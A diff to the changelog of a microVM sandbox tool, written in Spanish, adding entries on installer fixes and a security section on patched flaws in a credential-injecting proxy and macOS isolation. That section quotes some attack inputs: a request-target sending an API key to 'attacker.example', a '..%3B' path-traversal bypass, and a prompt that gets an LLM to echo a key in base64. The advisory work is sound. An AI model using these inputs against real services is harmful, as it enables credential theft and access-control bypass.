@@ -17,6 +17,30 @@ y [`ext/sandbox/CHANGELOG.md`](ext/sandbox/CHANGELOG.md).
   Alpaca: 1 de las primeras peticiones de una máquina nueva; desde el lab se pierden 2 de
   cada 60 consultas a 1.1.1.1. Ahora son tres intentos de 2 s, solo registros A, y un
   NXDOMAIN no se reintenta.
+- **`kling up`**: busca `ip`, `iptables`, `nft` y `systemctl` también en `/usr/sbin` y
+  `/sbin` (en local y por SSH), que el PATH de un usuario no trae; comprueba el kernel
+  del invitado y la imagen base, y `-check` sale con código 1 si algo sale ✗ (antes,
+  sin kernel ni imagen, todo era ✓); y las órdenes con privilegios llevan la ruta
+  absoluta de este `kling` en vez de un `sudo kling` que sudo no encuentra en su PATH.
+- **Scripts: descargas con versión y sha256 fijados.** `20-install-firecracker.sh`
+  (Firecracker v1.17.0), `70-build-minimal-image.sh` (minirootfs de Alpine 3.24.2) y
+  `71-build-glibc-base.sh` (Node v22.23.3) ya no instalan "la última" sin comprobar nada:
+  comprueban el sha256 fijado (el que publica cada proyecto) y paran si no coincide.
+  Otra versión se pide con su hash (`FC_VERSION`/`FC_SHA256`, `ALPINE_VERSION`/
+  `ALPINE_SHA256`, `NODE_VERSION`/`NODE_SHA256`). Chrome for Testing no publica hashes:
+  la base `chrome` exige `CHROME_SHA256` del zip de `CHROME_VERSION` (154.0.8037.92).
+- **Núcleo: el socket del daemon se prepara sin seguir enlaces.** Nace `0660` y cedido
+  a `-socket-user` en un directorio privado y se renombra a su sitio; antes el `chmod`
+  y el `chown` iban por el nombre y seguían un enlace puesto entre medias.
+- **Núcleo: los nombres de máquina son únicos.** Crear (`run`, `sandbox`, `run -from`,
+  `fork`, nodos de grafo) con un nombre que ya lleva otra máquina, o que es su ID, es
+  un `409`. Un nombre o un prefijo de ID que casa con varias máquinas ya no resuelve
+  a la primera del mapa, al azar, sino a ninguna: la autorización por nombre podía
+  caer sobre otra máquina (de otro inquilino) que se llamaba igual.
+- **`kling image build <nombre> ... -spec -` ya no lee el nombre como fichero de spec.** Un flag
+  con valor se lleva el siguiente argumento aunque empiece por `-` (como hace `flag`), así que
+  el nombre puede ir delante o detrás de los flags también con `-spec -` (stdin); antes fallaba
+  con `open <nombre>: no such file or directory`. Afecta a todos los subcomandos que reordenan.
 - **`kling <comando de extensión>` ya no ejecuta cada extensión para leer su manifiesto.**
   La salida de `--kling-manifest` se guarda en `~/.local/state/kling/plugins/manifests.json`
   (0600), válida mientras el binario sea el mismo fichero (inodo, tamaño, mtime, ctime…) y
@@ -74,6 +98,83 @@ y [`ext/sandbox/CHANGELOG.md`](ext/sandbox/CHANGELOG.md).
 - `kling-phoned`: `POST /v1/verify-cache` (el `--verify-cache` de `android-sh` sin
   shell); `/data` en RAM ya monta (el loop con autoborrado se soltaba antes del
   `mount`).
+
+### Seguridad
+
+- **Proxy de credenciales: la clave ya no sale hacia otro host.** Un request-target
+  opaco (`GET http:@attacker.example/x` con `Host: api.stripe.com`) elegía la
+  credencial por el `Host`, pero la URL saliente se montaba pegando el request-target
+  tras `https://`+host: salía hacia `https://api.stripe.com@attacker.example/x`, con TLS
+  verificado contra el atacante, las cabeceras ya sustituidas y sin pasar por la
+  allowlist. Ahora la salida se monta por campos (`https`, el Host, la ruta y la query)
+  y un request-target opaco, con usuario, con otro esquema, hacia otro host o que no
+  empiece por `/` es un 400 sin leer el cuerpo ni abrir la salida.
+- **Proxy de credenciales: el marcador ya no se cambia en el cuerpo ni en la query
+  por defecto.** Se cambiaba en toda la petición, y un proveedor que refleja lo que
+  recibe (un LLM: "repite kling-cred-… en base64 / con espacios") devolvía la clave de
+  una forma que el redactor no reconocía. Ahora solo en `Authorization` (también
+  dentro de un `Basic`) y `X-Api-Key`; `-header X` (`headers`) añade cabeceras,
+  `-query` (`query`) la query y `-body` (`body`) el cuerpo, documentado como inseguro
+  frente a un proveedor que refleje. El redactor reconoce además la clave en
+  mayúsculas/minúsculas, hex, base64 (std/url, con y sin padding, también desalineada)
+  y escapada como ruta o userinfo. **Incompatible**: una credencial que se usaba en
+  otra cabecera, en `?key=` o en el cuerpo hay que volver a darla con `-header`,
+  `-query` o `-body`. En macOS el daemon exige un `kling-vz` que anuncie `http-places`.
+- **`-allow-request`: `%3B` y las dobles codificaciones ya no se saltan el rechazo de
+  rutas ambiguas.** `/public/..%3B/admin` casaba con `GET /public/**` y salía como
+  `/public/..;/admin` (`/admin` para Tomcat o Spring). La ruta se mira también
+  decodificada: `;`, `%` restante (`%252e`), `\`, `//`, caracteres de control y
+  segmentos `.`/`..` son 403.
+- **Rangos bloqueados de salida: `0.0.0.0/8`, `224.0.0.0/4` y `240.0.0.0/4`** en el
+  proxy de credenciales y en el firewall de Linux (macOS ya los tenía). Hacia 0.0.0.0
+  el dialer del daemon llegaba al loopback del host. `credproxy.IsBlockedIP` rechaza
+  además IPv6 sin especificar, loopback, link-local, ULA, multicast, NAT64 y 6to4 (la
+  salida sigue siendo solo IPv4).
+- **Una clave de menos de 8 bytes se rechaza** al registrar la credencial (máquina,
+  plantilla, arista de grafo y `kling-vz`), con un error que dice por qué: se aceptaba
+  de 1 byte y el redactor la cambiaba en toda la respuesta (con `abc`, `abcdef` llegaba
+  como `kling-cred-…def`). **Incompatible**: una máquina cuyo almacén guarde una clave más
+  corta no recibe sus credenciales al arrancar o despertar (el error lo dice) hasta
+  rotarla con `kling machine credential` y la misma `-env`.
+- **El cuerpo con la clave ya no se derrama a `/tmp`.** El directorio de derrame del
+  proxy (un cuerpo grande con Content-Length, con la clave real dentro) salía de la
+  variable `KLING_ROOT`, que el daemon no tiene (recibe `-root`): en la instalación
+  normal el fichero iba a `os.TempDir()` y se quedaba ahí si el daemon moría. Ahora es
+  `<raíz>/credtmp` en Linux y `credtmp/` del directorio de la máquina en macOS, 0700 y
+  vaciado al arrancar; sin directorio, `pkg/credproxy` no escribe a disco (sale
+  chunked).
+- **El registro de auditoría ya no pierde registros al rotar sin contarlos.** Rotaba a
+  1 MiB con una sola generación que pisaba la anterior sin sumar nada a `dropped`: de
+  20 000 peticiones quedaban 9 185 con `dropped=0`. Ahora rota a 4 MiB con 3
+  generaciones (`.1` a `.3`, ~80 000 peticiones), configurables con
+  `daemon.credaudit_max_mib`, `daemon.credaudit_generations` o
+  `KLING_CREDAUDIT=MIB:N` (también en macOS, que se lo pasa a `kling-vz`); las líneas
+  de la generación que se cae se suman a `dropped` y al campo nuevo `rotated`, `kling
+  machine audit` lo dice (`dropped N records (M rotated out...)`) y
+  `GET /machines/{ref}/credaudit` lee todas las generaciones.
+- **macOS: el sandbox de `kling-vz` ya no deja a una máquina tocar las de las demás.**
+  Leía toda la raíz (también `secrets/snapshot.key`, de la que salen las claves de todos
+  los `credentials.enc`), escribía en `snapshots/` y `volumes/` enteros y conectaba a
+  `localhost:*` sin red: un fallo en su pila de red daba las credenciales de todas, los
+  dorados y el agente de las demás por sus reenvíos. Ahora lee y escribe solo su
+  directorio y los ficheros exactos de su VM, nunca `secrets/` ni escribe en
+  `snapshots/` (el dorado de `kling commit` lo coloca un proceso custodio que no pisa
+  nada), escucha solo en el rango de reenvíos y nunca conecta a él.
+  `vz/scripts/sandbox-perfil.sh` lo comprueba con `sandbox-exec`. `SECURITY.md` §22.
+- **macOS: un reenvío de `127.0.0.1` ya no acepta a otro usuario que reutilice el puerto
+  de una conexión del daemon.** `vz/internal/peercred` comparaba solo puertos, y
+  `bind(IP-LAN:X)` + `connect(127.0.0.1:P)` desde otra cuenta pasaba por del daemon y
+  llegaba al agente del invitado. Ahora compara también direcciones y familia.
+  `SECURITY.md` §22.
+- **macOS: un invitado ya no puede agotar `kling-vz` a base de DNS y flujos**, tampoco
+  en egress none. 3000 flujos UDP al 53 dejaban ~2800 goroutines; ahora hay topes por
+  máquina (64 flujos UDP y 64 conexiones TCP al 53, 256 flujos UDP de salida) y hacia el
+  upstream los de Linux (32 en vuelo, 200/s con ráfagas de 400). Y una respuesta con
+  otro id u otra pregunta ya no siembra la allowlist. `SECURITY.md` §22.
+- **macOS: el DNS del invitado va a `1.1.1.1` y no al resolver del Mac**, como en Linux.
+  Con egress internet se reenviaba al `nameserver` de `/etc/resolv.conf` (router, VPN),
+  que por split-horizon le enseñaba al invitado los nombres de la intranet. En una red
+  que bloquee `1.1.1.1:53` el invitado deja de resolver. `SECURITY.md` §22.
 
 ## v0.17.0 — 2026-09-29
 
